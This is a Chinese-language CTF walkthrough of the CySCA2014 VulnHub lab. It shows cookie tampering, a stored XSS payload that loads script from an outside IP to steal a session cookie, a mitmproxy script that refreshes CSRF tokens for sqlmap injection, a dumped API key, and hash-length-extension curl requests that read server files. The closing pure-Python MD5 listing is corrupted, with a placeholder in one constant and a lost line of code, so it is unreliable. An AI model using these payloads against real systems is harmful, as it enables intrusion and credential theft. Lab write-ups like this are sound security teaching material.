看到在freebuf上面没有这个CTF靶场的解题过程就写下来记录一下。

外国友人已经将整个CTF竞赛的题目**到虚拟机里面我们启动虚拟机就可以练习测试。CySCA2014-in-a-Box是一款虚拟机包含了CySCA2014期间玩家面临的大部分挑战。它允许玩家在自己的时间内完成挑战学习和发展他们的网络安全技能。VM包括评分面板的静态版本包含所有挑战所需文件和标志。

下载地址见下面

    
    
    https://download.vulnhub.com/cysca/CySCA2014InABox.7z

将虚拟机的网卡设置为桥接用netdiscover工具查找靶场的IP找到靶场的IP为`192.168.0.104`

![image.png](https://image.3001.net/images/20190820/1566311482_5d5c043aa5f9a.png)使用nmap探测靶场开放了什么端口

    
    
    root@kali:/tmp# nmap -sV -p1-65535 192.168.0.104
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-20 10:18 EDT
    Nmap scan report for 192.168.0.104
    Host is up (0.0013s latency).
    Not shown: 65518 closed ports
    PORT      STATE SERVICE     VERSION
    22/tcp    open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
    80/tcp    open  http        Apache httpd 2.2.22 ((Ubuntu))
    1337/tcp  open  waste?
    3422/tcp  open  icecream    icecreamd
    5050/tcp  open  mmcc?
    7788/tcp  open  unknown
    7821/tcp  open  printer     Panasonic mfpscdl.exe service
    9090/tcp  open  zeus-admin?
    9876/tcp  open  sd?
    9999/tcp  open  abyss?
    12345/tcp open  netbus?
    12433/tcp open  nagios-nsca Nagios NSCA
    16831/tcp open  unknown
    20000/tcp open  dnp?
    20001/tcp open  microsan?
    21320/tcp open  unknown
    22523/tcp open  unknown
    9 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
    

我们可以看到靶场开放了80端口使用浏览器打开web服务看到下面有不同的挑战接下来我们对每个挑战进行练习。

![image.png](https://image.3001.net/images/20190820/1566311669_5d5c04f56788a.png)  

# Web Application Pentest

## Club Status

 **只有VIP和注册用户才能查看日志。成为VIP以获得对博客的访问权以显示隐藏的标志。**  

打开首页可以看见我们是guest用户blog超链接显示灰色无法点击

![image.png](https://image.3001.net/images/20190820/1566312079_5d5c068f4dd17.png)在浏览器输入/blog目录会自动跳转到login.php

![image.png](https://image.3001.net/images/20190820/1566312184_5d5c06f80b3aa.png)使用bp抓个包分析一下发现在cookie中一个VIP参数存在问题是不是可以修改为1就可以访问blog目录呢

![image.png](https://image.3001.net/images/20190820/1566312225_5d5c072105e3f.png)  

发现修改之后就可以访问blog目录的资源

![image.png](https://image.3001.net/images/20190820/1566312376_5d5c07b889399.png)  

![image.png](https://image.3001.net/images/20190820/1566312343_5d5c07970855c.png)我们可以看到VIP
FLAG是ComplexKillingInverse411  
![image.png](https://image.3001.net/images/20190820/1566312351_5d5c079feac8a.png)  

  

## Om nom nom nom

 **以注册用户的身份访问日志以显示隐藏标志。**  

继续以VIP=1的状态查看blog发现有个奇怪地方这个sycamore最后查看是在19秒前那是不是后台有个机器人在模拟访问

![image.png](https://image.3001.net/images/20190820/1566313080_5d5c0a78cf5d9.png)而且下面有个评论输入框
**我相信这个使用存储型XSS漏洞获取这个账号的cookie。**

每篇文章底部的评论机制允许在没有认证的情况下发送评论。乍一看似乎可以防止XSS攻击。除了指示告诉我们如何发布链接

类似BBcode的机制允许我们覆盖字符过滤。所以我能够发表以下评论

`[<script src=<http://IP/test.js>></script>](test)`  

接下来我用蓝莲花的XSS接收平台来接受cookie我这边已经用docker封装好了

    
    
    docker run -it -p 80:80 wushangleon/xss_platform  
    

  
  
  

![image.png](https://image.3001.net/images/20190820/1566314346_5d5c0f6a1a392.png)成功获取到cookie

![image.png](https://image.3001.net/images/20190820/1566314472_5d5c0fe8ebfce.png)进入到blog目录可以看到flagOrganicShantyAbsent505

![image.png](https://image.3001.net/images/20190820/1566314590_5d5c105eb8b14.png)  

## Nonce-sense

 **从数据库中检索隐藏标志。**  

使用sycamore用户访问文章的时候右侧有一个垃圾桶的按钮

![image.png](https://image.3001.net/images/20190820/1566315077_5d5c1245ea17d.png)查看页面源代码找到了这段JS脚本

![image.png](https://image.3001.net/images/20190820/1566315254_5d5c12f6a5a16.png)使用BP进行抓包看到post的数据里面有csrf的token

![image.png](https://image.3001.net/images/20190820/1566315470_5d5c13ce024e8.png)而且发现csrftoken用完一次就失效了

![image.png](https://image.3001.net/images/20190820/1566315539_5d5c1413e9dcb.png)不过response回来的csrf是可以使用的

我后来发现CSRFtoken是直接显示在html上面于是可以写个代理篡改的插件具体思路请参照[这里](https://www.freebuf.com/column/171405.html)

![image.png](https://image.3001.net/images/20190820/1566315679_5d5c149f5db4a.png)  

数据包

    
    
    POST /deletecomment.php HTTP/1.1
    Host: 192.168.0.104
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Referer: http://192.168.0.104/blog.php?view=1
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 35
    Connection: close
    Cookie: PHPSESSID=22skmq38jb1kbrj0i79b8p3cq1; vip=0
    
    csrf=18b6ee4fe3f1d2bb&comment_id=55
    

思路代理拦截替换CSRFTOKEN字符串就可以了

    
    
    #mitmproxy == 0.18.2 python2.7
    
    from mitmproxy.proxy.server import ProxyServer
    from mitmproxy import flow,  controller
    from mitmproxy import flow, proxy, controller, options
    import re
    import requests
    
    
    def get_csrftoken():
        url = "http://192.168.0.104/deletecomment.php"
        headers = {
            "Host": "192.168.0.104",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Accept": "*/*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Referer": "http://192.168.0.104/blog.php?view=1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Length": "35",
            "Connection": "close",
            "Cookie": "PHPSESSID=ms0m60l5jmq2uhkbu90g3bm8t1; vip=0"
        }
        data = {
            "csrf":"c285766ae0987c54",
            "comment_id":55
        }
        r = requests.post(url=url, headers=headers, data=data)
        print(r.json())
        return r.json()['csrf']
    
    
    class WSProxy(flow.FlowMaster):
        def __init__(self, opts, server, state, unsave_data):
            super(WSProxy, self).__init__(opts, server, state)
            self.unsave_data = unsave_data
        def run(self):
            try:
                print("start")
                flow.FlowMaster.run(self)
            except KeyboardInterrupt:
                self.shutdown()
    
        @controller.handler
        def request(self, f):
            wsproxy_request_handle(f)
    
        @controller.handler
        def response(self, f):
            wsproxy_response_handle(f)
            # parser = ResponseParser(f)
            # insert_result(parser.parser_data())
    
    def wsproxy_request_handle(flow):
        """wyproxy send data to server before processing"""
    
        try:
            csrf = get_csrftoken()
            data = flow.request.content.replace("c285766ae0987c54",str(csrf))
            flow.request.content = data
            print(flow.request.content)
        except IndexError:
            pass
    
    
    def wsproxy_response_handle(flow):
        print(flow.response.content)
    
    port = 8888  #
    mode = 'regular'  #mode=regular
    opts = options.Options(
            listen_port=int(port),
            mode=mode,
            cadir="./ssl/",
    )
    unsave_data = False
    config = proxy.ProxyConfig(opts)
    state = flow.State()
    server = ProxyServer(config)
    m = WSProxy(opts, server, state, unsave_data)
    m.run()
    
    

可以看到csrf随着SQLMAP的注入而发生变化

![image.png](https://image.3001.net/images/20190821/1566355524_5d5cb044382cf.png)

成功注入  
![image.png](https://image.3001.net/images/20190821/1566355566_5d5cb06eab532.png)继续深入就可以找到flagCeramicDrunkSound667

![image.png](https://image.3001.net/images/20190821/1566355729_5d5cb1114bc56.png)先记录一下用户和密码说不定后面有用

![image.png](https://image.3001.net/images/20190821/1566355934_5d5cb1de80359.png)记录api
key

![image.png](https://image.3001.net/images/20190821/1566356670_5d5cb4be3f853.png)

    
    
    Database: cysca
    Table: rest_api_log
    [5 entries]
    +----+--------+-----------------------------------------------------------------------------------------------------------------------------------+------------------+---------------------+-----------------------------+
    | id | method | params                                                                                                                            | api_key          | created_on          | request_uri                 |
    +----+--------+-----------------------------------------------------------------------------------------------------------------------------------+------------------+---------------------+-----------------------------+
    | 1  | POST   | contenttype=application%2Fpdf&filepath=.%2Fdocuments%2FTop_4_Mitigations.pdf&api_sig=235aca08775a2070642013200d70097a             | b32GjABvSf1Eiqry | 2014-02-21 09:27:20 | \\/api\\/documents          |
    | 2  | GET    | _url=%2Fdocuments&id=2                                                                                                            | NULL             | 2014-02-21 11:47:01 | \\/api\\/documents\\/id\\/2 |
    | 3  | POST   | contenttype=text%2Fplain&filepath=.%2Fdocuments%2Frest-api.txt&api_sig=95a0e7dbe06fb7b77b6a1980e2d0ad7d                           | b32GjABvSf1Eiqry | 2014-02-21 11:54:31 | \\/api\\/documents          |
    | 4  | PUT    | _url=%2Fdocuments&id=3&contenttype=text%2Fplain&filepath=.%2Fdocuments%2Frest-api-v2.txt&api_sig=6854c04381284dac9970625820a8d32b | b32GjABvSf1Eiqry | 2014-02-21 12:07:43 | \\/api\\/documents\\/id\\/3 |
    | 5  | GET    | _url=%2Fdocuments&id=3                                                                                                            | NULL             | 2019-08-21 00:52:14 | \\/api\\/documents\\/id\\/3 |
    +----+--------+-----------------------------------------------------------------------------------------------------------------------------------+------------------+---------------------+-----------------------------+

## Hypertextension

 **通过访问缓存控制面板来检索隐藏标志。**  

来到这里突然没有什么可以利用的于是我就爆破目录找到一个 **cache.php(缓存页面)**
不过无论怎么访问这个页面都会302跳转到login.php页面

![image.png](https://image.3001.net/images/20190821/1566357578_5d5cb84aa4b55.png)  

我们一开始在文章里面看过有一个rest api文档一直都没有被利用结合SQLMAP获取到的API KEY我就试试

    
    
    All API calls using an authentication token must be signed and contain a X-Auth header with your api_key e.g. X-Auth: <api_key>. This will include all calls that modify content i.e. POST/PUT/DELETE methods.
    The process of signing is as follows.
    - Sort your argument list into alphabetical order based on the parameter name. e.g. foo=1, bar=2, baz=3 sorts to bar=2, baz=3, foo=1
    - concatenate the shared secret and argument name-value pairs. e.g. SECRETbar2baz3foo1
    - calculate the md5() hash of this string
    - append this value to the argument list with the name api_sig, in hexidecimal string form. e.g. api_sig=1f3870be274f6c49b3e31a0c6728957f
    
    /api/documents (GET)
    DESCRIPTION: List all documents
    RESPONSE: Document metadata in JSON format in the body.
    
    /api/documents/id/<uid> (GET)
    DESCRIPTION: Download a document
    PARAMETERS: <uid> The unique identifier of the document
    RESPONSE: Document raw data in the body. Document metadata in JSON format in the X-Metadata header.
    
    /api/documents (POST)
    DESCRIPTION: Create a document record
    PARAMETERS: filepath required The path to the uploaded document. e.g. ./documents/mydocument.pdf (note that currently we need to manually upload the file)
    contenttype required The MIME content type e.g. application/pdf
    RESPONSE: A uri to the new document in JSON format in the body
    
    /api/documents/id/<uid> (PUT)
    DESCRIPTION: Update an existing document record
    PARAMETERS: <uid> The unique identifier of the document you wish to modify
    filepath required The path to the uploaded document. e.g. ./documents/mydocument.pdf (note that currently we need to manually upload the file)
    contenttype required The MIME content type e.g. application/pdf
    RESPONSE: An empty JSON array in the body
    
    An example with CURL:
    curl -X POST -d 'contenttype=application/pdf&filepath=./documents/example.pdf&api_sig=<signature>' -H 'X-Auth: your_secret_key' http://www.fortcerts.cysca/api/documents
    
    
    必须对使用身份验证令牌的所有API调用进行签名并在其中包含带有api_key的X-Auth标头例如X-Auth<api_key>。这将包括修改内容的所有调用即POST / PUT / DELETE方法。
    签署过程如下。
    - 根据参数名称将参数列表排序为字母顺序。例如foo = 1bar = 2baz = 3排序到bar = 2baz = 3foo = 1
    - 连接共享密钥和参数名称 - 值对。例如SECRETbar2baz3foo1
    - 计算此字符串的md5哈希值
    - 以十六进制字符串形式将此值附加到名为api_sig的参数列表中。例如api_sig = 1f3870be274f6c49b3e31a0c6728957f
    
    / api / documentsGET
    描述列出所有文档
    响应在正文中以JSON格式记录元数据。
    
    / api / documents / id / <uid>GET
    描述下载文档
    参数<uid>文档的唯一标识符
    响应记录正文中的原始数据。在X-Metadata标头中以JSON格式记录元数据。
    
    / api / documentsPOST
    描述创建文档记录
    参数需要文件路径上载文档的路径。例如./documents/mydocument.pdf注意目前我们需要手动上传文件
    contenttype required MIME内容类型例如application / pdf
    响应体内JSON格式的新文档的uri
    
    / api / documents / id / <uid>PUT
    描述更新现有文档记录
    参数<uid>您要修改的文档的唯一标识符
    filepath required上载文档的路径。例如./documents/mydocument.pdf注意目前我们需要手动上传文件
    contenttype required MIME内容类型例如application / pdf
    响应正文中的空JSON数组
    
    CURL的一个例子
    curl -X POST -d'contenttype = application / pdffilepath =。/ documents / example.pdfapi_sig = <signature>'-H'X-Authyour_secret_key'http//www.fortcerts.cysca/api/documents

在这里你需要修改Content-Type的类型

    
    
    常见的媒体格式类型如下
        text/html  HTML格式
        text/plain 纯文本格式      
        text/xml   XML格式
        image/gif gif图片格式    
        image/jpeg jpg图片格式 
        image/pngpng图片格式   
    以application开头的媒体格式类型
       application/xhtml+xml XHTML格式
       application/xml      XML数据格式
       application/atom+xml  Atom XML聚合格式    
       application/json     JSON数据格式
       application/pdf       pdf格式  
       application/msword   Word文档格式
       application/octet-stream  二进制流数据如常见的文件下载
       application/x-www-form-urlencoded  <form encType=””>中默认的encTypeform表单数据被编码为key/value格式发送到服务器表单默认的提交数据的格式   另外一种常见的媒体格式是上传文件之时使用的
        multipart/form-data  需要在表单中进行文件上传时就需要使用该格式
    

按照文档可以访问到接口

    
    
    1
    curl -X PUT -d 'contenttype=text/plain&filepath=./documents/rest-api-v2.txt&id=3&api_sig=6854c04381284dac9970625820a8d32b' -H 'X-Auth: b32GjABvSf1Eiqry' http://192.168.0.104/api/documents
    []
      
    

根据文档api_sig的生成过程是

    
    
    所有的参数名要按照顺序来排序比如a=1&b=2&c=3然后提取参数名和参数内容加上密钥再MD5加密
    md5(密钥+contenttypetext/plain+filepath./documents/rest-api-v2.txt+id3)(注没有+号的)
    

由于我们不知道密钥是什么我们就用 **hash扩展长度攻击**
我们用hashpump工具进行攻击这个工具需要按照看[官方文档](https://github.com/bwall/HashPump)

    
    
    root@kali:/tmp/HashPump# hashpump  -h
    HashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength]
         HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.
         -h --help          Display this message.
         -t --test          Run tests to verify each algorithm is operating properly.
         -s --signature     The signature from known message.
         -d --data          The data from the known message.
         -a --additional    The information you would like to add to the known message.
         -k --keylength     The length in bytes of the key being used to sign the original message with.
         Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.
         <Developed by bwall(@botnet_hunter)>
    

在16key长度那里成功了  

    
    
    root@kali:/tmp/HashPump# hashpump -s 6854c04381284dac9970625820a8d32b  -d "contenttypetext/plainfilepath./documents/rest-api-v2.txtid3" -a "contenttypetext/plainfilepath./index.phpid3" -k 16
    4625e458d07cb19da70effa3d1c6dc14
    contenttypetext/plainfilepath./documents/rest-api-v2.txtid3\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00X\x02\x00\x00\x00\x00\x00\x00contenttypetext/plainfilepath./index.phpid3
    
    
    curl -X PUT -d 'c=ontenttypetext/plainfilepath./documents/rest-api-v2.txtid3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00X%02%00%00%00%00%00%00&contenttype=text/plain&filepath=./index.php&api_sig=4625e458d07cb19da70effa3d1c6dc14' -H 'X-Auth: b32GjABvSf1Eiqry' http://192.168.0.104/api/documents/id/3
    

查看文档的网址提示有一个cache.php

![image.png](https://image.3001.net/images/20190821/1566362944_5d5ccd40397c3.png)我们用同样的办法读取cache.php文件

    
    
    root@kali:/tmp/HashPumphashpump -s 6854c04381284dac9970625820a8d32b  -d "contenttypetext/plainfilepath./documents/rest-api-v2.txtid3" -a "contenttypetext/plainfilepath./cache.phpid3" -k 16
    7ce6ab9db63a1d07500d091e567086b1
    contenttypetext/plainfilepath./documents/rest-api-v2.txtid3\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00X\x02\x00\x00\x00\x00\x00\x00contenttypetext/plainfilepath./cache.phpid3
    
    
    root@kali:/tmp/HashPump# curl -X PUT -d 'c=ontenttypetext/plainfilepath./documents/rest-api-v2.txtid3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00X%02%00%00%00%00%00%00&contenttype=text/plain&filepath=./cache.php&api_sig=7ce6ab9db63a1d07500d091e567086b1' -H 'X-Auth: b32GjABvSf1Eiqry' http://192.168.0.104/api/documents/id/3
    []
      
    

找到flag为OrganicPamperSenator877

![image.png](https://image.3001.net/images/20190821/1566363102_5d5ccddeed20c.png)  

后来找了一下资料看到别人写了个自动化的脚本

puremd5.py  

    
    
    #!/usr/bin/env python
    
    """A sample implementation of MD5 in pure Python.
    
    This is an implementation of the MD5 hash function, as specified by
    RFC 1321, in pure Python. It was implemented using Bruce Schneier's
    excellent book "Applied Cryptography", 2nd ed., 1996.
    
    Surely this is not meant to compete with the existing implementation
    of the Python standard library (written in C). Rather, it should be
    seen as a Python complement that is more readable than C and can be
    used more conveniently for learning and experimenting purposes in
    the field of cryptography.
    
    This module tries very hard to follow the API of the existing Python
    standard library's "md5" module, but although it seems to work fine,
    it has not been extensively tested! (But note that there is a test
    module, test_md5py.py, that compares this Python implementation with
    the C one of the Python standard library.
    
    BEWARE: this comes with no guarantee whatsoever about fitness and/or
    other properties! Specifically, do not use this in any production
    code! License is Python License!
    
    Special thanks to Aurelian Coman who fixed some nasty bugs!
    
    Dinu C. Gherman
    """
    
    
    __date__    = '2001-10-1'
    __version__ = 0.9
    
    
    import struct, string, copy
    
    
    # ======================================================================
    # Bit-Manipulation helpers
    #
    #   _long2bytes() was contributed by Barry Warsaw
    #   and is reused here with tiny modifications.
    # ======================================================================
    
    def _long2bytes(n, blocksize=0):
        """Convert a long integer to a byte string.
    
        If optional blocksize is given and greater than zero, pad the front
        of the byte string with binary zeros so that the length is a multiple
        of blocksize.
        """
    
        # After much testing, this algorithm was deemed to be the fastest.
        s = ''
        pack = struct.pack
        while n > 0:
            ### CHANGED FROM '>I' TO '<I'. (DCG)
            s = pack('<I', n & 0xffffffffL) + s
            ### --------------------------            n = n >> 32
    
        # Strip off leading zeros.
        for i in range(len(s)):
            if s[i] <> '\000':
                break
        else:
            # Only happens when n == 0.
            s = '\000'
            i = 0
    
        s = s[i:]
    
        # Add back some pad bytes. This could be done more efficiently
        # w.r.t. the de-padding being done above, but sigh...
        if blocksize > 0 and len(s) % blocksize:
            s = (blocksize - len(s) % blocksize) * '\000' + s
    
        return s
    
    
    def _bytelist2long(list):
        "Transform a list of characters into a list of longs."
    
        imax = len(list)/4
        hl = [0L] * imax
    
        j = 0
        i = 0
        while i < imax:
            b0 = long(ord(list[j]))
            b1 = (long(ord(list[j+1]))) << 8
            b2 = (long(ord(list[j+2]))) << 16
            b3 = (long(ord(list[j+3]))) << 24
            hl[i] = b0 | b1 |b2 | b3
            i = i+1
            j = j+4
    
        return hl
    
    
    def _rotateLeft(x, n):
        "Rotate x (32 bit) left n bits circularly."
    
        return (x << n) | (x >> (32-n))
    
    
    # ======================================================================
    # The real MD5 meat...
    #
    #   Implemented after "Applied Cryptography", 2nd ed., 1996,
    #   pp. 436-441 by Bruce Schneier.
    # ======================================================================
    
    # F, G, H and I are basic MD5 functions.
    
    def F(x, y, z):
        return (x & y) | ((~x) & z)
    
    def G(x, y, z):
        return (x & z) | (y & (~z))
    
    def H(x, y, z):
        return x ^ y ^ z
    
    def I(x, y, z):
        return y ^ (x | (~z))
    
    
    def XX(func, a, b, c, d, x, s, ac):
        """Wrapper for call distribution to functions F, G, H and I.
    
        This replaces functions FF, GG, HH and II from "Appl. Crypto.
        Rotation is separate from addition to prevent recomputation
        (now summed-up in one function).
        """
    
        res = 0L
        res = res + a + func(b, c, d)
        res = res + x 
        res = res + ac
        res = res & 0xffffffffL
        res = _rotateLeft(res, s)
        res = res & 0xffffffffL
        res = res + b
    
        return res & 0xffffffffL
    
    
    class MD5:
        "An implementation of the MD5 hash function in pure Python."
    
        def __init__(self):
            "Initialisation."
            
            # Initial 128 bit message digest (4 times 32 bit).
            self.A = 0L
            self.B = 0L
            self.C = 0L
            self.D = 0L
            
            # Initial message length in bits(!).
            self.length = 0L
            self.count = [0, 0]
    
            # Initial empty message as a sequence of bytes (8 bit characters).
            self.input = []
    
            # Length of the final hash (in bytes).
            self.HASH_LENGTH = 16
             
            # Length of a block (the number of bytes hashed in every transform).
            self.DATA_LENGTH = 64
    
            # Call a separate init function, that can be used repeatedly
            # to start from scratch on the same object.
            self.init()
    
    
        def init(self):
            "Initialize the message-digest and set all fields to zero."
    
            self.length = 0L
            self.input = []
    
            # Load magic initialization constants.
            self.A = 0x67452301L
            self.B = 0xefcdab89L
            self.C = 0x98badcfeL
            self.D = 0x10325476L
    
    
        def _transform(self, inp):
            """Basic MD5 step transforming the digest based on the input.
    
            Note that if the Mysterious Constants are arranged backwards
            in little-endian order and decrypted with the DES they produce
            OCCULT MESSAGES!
            """
    
            a, b, c, d = A, B, C, D = self.A, self.B, self.C, self.D
    
            # Round 1.
    
            S11, S12, S13, S14 = 7, 12, 17, 22
    
            a = XX(F, a, b, c, d, inp[ 0], S11, 0xD76AA478L) # 1 
            d = XX(F, d, a, b, c, inp[ 1], S12, 0xE8C7B756L) # 2 
            c = XX(F, c, d, a, b, inp[ 2], S13, 0x242070DBL) # 3 
            b = XX(F, b, c, d, a, inp[ 3], S14, 0xC1BDCEEEL) # 4 
            a = XX(F, a, b, c, d, inp[ 4], S11, 0xF57C0FAFL) # 5 
            d = XX(F, d, a, b, c, inp[ 5], S12, 0x4787C62AL) # 6 
            c = XX(F, c, d, a, b, inp[ 6], S13, 0xA8304613L) # 7 
            b = XX(F, b, c, d, a, inp[ 7], S14, 0xFD469501L) # 8 
            a = XX(F, a, b, c, d, inp[ 8], S11, 0x698098D8L) # 9 
            d = XX(F, d, a, b, c, inp[ 9], S12, 0x8B44F7AFL) # 10 
            c = XX(F, c, d, a, b, inp[10], S13, 0xFFFF5BB1L) # 11 
            b = XX(F, b, c, d, a, inp[11], S14, 0x895CD7BEL) # 12 
            a = XX(F, a, b, c, d, inp[12], S11, 0x6B901122L) # 13 
            d = XX(F, d, a, b, c, inp[13], S12, 0xFD987193L) # 14 
            c = XX(F, c, d, a, b, inp[14], S13, 0xA679438EL) # 15 
            b = XX(F, b, c, d, a, inp[15], S14, 0x49B40821L) # 16 
    
            # Round 2.
    
            S21, S22, S23, S24 = 5, 9, 14, 20
    
            a = XX(G, a, b, c, d, inp[ 1], S21, 0xF61E2562L) # 17 
            d = XX(G, d, a, b, c, inp[ 6], S22, 0xC040B340L) # 18 
            c = XX(G, c, d, a, b, inp[11], S23, 0x265E5A51L) # 19 
            b = XX(G, b, c, d, a, inp[ 0], S24, 0xE9B6C7AAL) # 20 
            a = XX(G, a, b, c, d, inp[ 5], S21, 0xD62F105DL) # 21 
            d = XX(G, d, a, b, c, inp[10], S22, 0x02441453L) # 22 
            c = XX(G, c, d, a, b, inp[15], S23, 0xD8A1E681L) # 23 
            b = XX(G, b, c, d, a, inp[ 4], S24, 0xE7D3FBC8L) # 24 
            a = XX(G, a, b, c, d, inp[ 9], S21, 0x21E1CDE6L) # 25 
            d = XX(G, d, a, b, c, inp[14], S22, 0xC33707D6L) # 26 
            c = XX(G, c, d, a, b, inp[ 3], S23, 0xF4D50D87L) # 27 
            b = XX(G, b, c, d, a, inp[ 8], S24, 0x455A14EDL) # 28 
            a = XX(G, a, b, c, d, inp[13], S21, 0xA9E3E905L) # 29 
            d = XX(G, d, a, b, c, inp[ 2], S22, 0xFCEFA3F8L) # 30 
            c = XX(G, c, d, a, b, inp[ 7], S23, 0x676F02D9L) # 31 
            b = XX(G, b, c, d, a, inp[12], S24, 0x8D2A4C8AL) # 32 
    
            # Round 3.
    
            S31, S32, S33, S34 = 4, 11, 16, 23
    
            a = XX(H, a, b, c, d, inp[ 5], S31, 0xFFFA3942L) # 33 
            d = XX(H, d, a, b, c, inp[ 8], S32, 0x8771F681L) # 34 
            c = XX(H, c, d, a, b, inp[11], S33, 0x6D9D6122L) # 35 
            b = XX(H, b, c, d, a, inp[14], S34, 0xFDE5380CL) # 36 
            a = XX(H, a, b, c, d, inp[ 1], S31, 0xA4BEEA44L) # 37 
            d = XX(H, d, a, b, c, inp[ 4], S32, 0x4BDECFA9L) # 38 
            c = XX(H, c, d, a, b, inp[ 7], S33, 0xF6BB4B60L) # 39 
            b = XX(H, b, c, d, a, inp[10], S34, 0xBEBFBC70L) # 40 
            a = XX(H, a, b, c, d, inp[13], S31, 0x289B7EC6L) # 41 
            d = XX(H, d, a, b, c, inp[ 0], S32, 0xEAA127FAL) # 42 
            c = XX(H, c, d, a, b, inp[ 3], S33, 0xD4EF3085L) # 43 
            b = XX(H, b, c, d, a, inp[ 6], S34, 0x04881D05L) # 44 
            a = XX(H, a, b, c, d, inp[ 9], S31, 0xD9D4D039L) # 45 
            d = XX(H, d, a, b, c, inp[12], S32, 0xE6DB99E5L) # 46 
            c = XX(H, c, d, a, b, inp[15], S33, 0x1FA27CF8L) # 47 
            b = XX(H, b, c, d, a, inp[ 2], S34, 0x**AC5665L) # 48 
    
            # Round 4.
    
            S41, S42, S43, S44 = 6, 10, 15, 21
    
            a = XX(I, a, b, c, d, inp[ 0], S41, 0xF4292244L) # 49 
            d = XX(I, d, a, b, c, inp[ 7], S42, 0x432AFF97L) # 50 
            c = XX(I, c, d, a, b, inp[14], S43, 0xAB9423A7L) # 51 
            b = XX(I, b, c, d, a, inp[ 5], S44, 0xFC93A039L) # 52 
            a = XX(I, a, b, c, d, inp[12], S41, 0x655B59C3L) # 53 
            d = XX(I, d, a, b, c, inp[ 3], S42, 0x8F0CCC92L) # 54 
            c = XX(I, c, d, a, b, inp[10], S43, 0xFFEFF47DL) # 55 
            b = XX(I, b, c, d, a, inp[ 1], S44, 0x85845DD1L) # 56 
            a = XX(I, a, b, c, d, inp[ 8], S41, 0x6FA87E4FL) # 57 
            d = XX(I, d, a, b, c, inp[15], S42, 0xFE2CE6E0L) # 58 
            c = XX(I, c, d, a, b, inp[ 6], S43, 0xA3014314L) # 59 
            b = XX(I, b, c, d, a, inp[13], S44, 0x4E0811A1L) # 60 
            a = XX(I, a, b, c, d, inp[ 4], S41, 0xF7537E82L) # 61 
            d = XX(I, d, a, b, c, inp[11], S42, 0xBD3AF235L) # 62 
            c = XX(I, c, d, a, b, inp[ 2], S43, 0x2AD7D2BBL) # 63 
            b = XX(I, b, c, d, a, inp[ 9], S44, 0xEB86D391L) # 64 
    
            A = (A + a) & 0xffffffffL
            B = (B + b) & 0xffffffffL
            C = (C + c) & 0xffffffffL
            D = (D + d) & 0xffffffffL
    
            self.A, self.B, self.C, self.D = A, B, C, D
    
    
        # Down from here all methods follow the Python Standard Library
        # API of the md5 module.
    
        def update(self, inBuf):
            """Add to the current message.
    
            Update the md5 object with the string arg. Repeated calls
            are equivalent to a single call with the concatenation of all
            the arguments, i.e. m.update(a); m.update(b) is equivalent
            to m.update(a+b).
            """
    
            leninBuf = long(len(inBuf))
    
            # Compute number of bytes mod 64.
            index = (self.count[0] >> 3) & 0x3FL
    
            # Update number of bits.
            self.count[0] = self.count[0] + (leninBuf << 3)
            if self.count[0] < (leninBuf << 3):
                self.count[1] = self.count[1] + 1
            self.count[1] = self.count[1] + (leninBuf >> 29)
    
            partLen = 64 - index
    
            if leninBuf >= partLen:
                self.input[index:] = map(None, inBuf[:partLen])
                self._transform(_bytelist2long(self.input))
                i = partLen
                while i + 63 < leninBuf:
                    self._transform(_bytelist2long(map(None, inBuf[i:i+64])))
                    i = i + 64
                else:
                    self.input = map(None, inBuf[i:leninBuf])
            else:
                i = 0
                self.input = self.input + map(None, inBuf)
    
    
        def digest(self):
            """Terminate the message-digest computation and return digest.
    
            Return the digest of the strings passed to the update()
            method so far. This is a 16-byte string which may contain
            non-ASCII characters, including null bytes.
            """
    
            A = self.A
            B = self.B
            C = self.C
            D = self.D
            input = [] + self.input
            count = [] + self.count
    
            index = (self.count[0] >> 3) & 0x3fL
    
            if index < 56:
                padLen = 56 - index
            else:
                padLen = 120 - index
    
            padding = ['\200'] + ['\000'] * 63
            self.update(padding[:padLen])
    
            # Append length (before padding).
            bits = _bytelist2long(self.input[:56]) + count
    
            self._transform(bits)
    
            # Store state in digest.
            digest = _long2bytes(self.A << 96, 16)[:4] + \
                     _long2bytes(self.B << 64, 16)[4:8] + \
                     _long2bytes(self.C << 32, 16)[8:12] + \
                     _long2bytes(self.D, 16)[12:]
    
            self.A = A 
            self.B = B
            self.C = C
            self.D = D
            self.input = input 
            self.count = count 
    
            return digest
    
    
        def hexdigest(self):
            """Terminate and return digest in HEX form.
    
            Like digest() except the digest is returned as a string of
            length 32, containing only hexadecimal digits. This may be
            used to exchange the value safely in email or other non-            binary environments.
            """
    
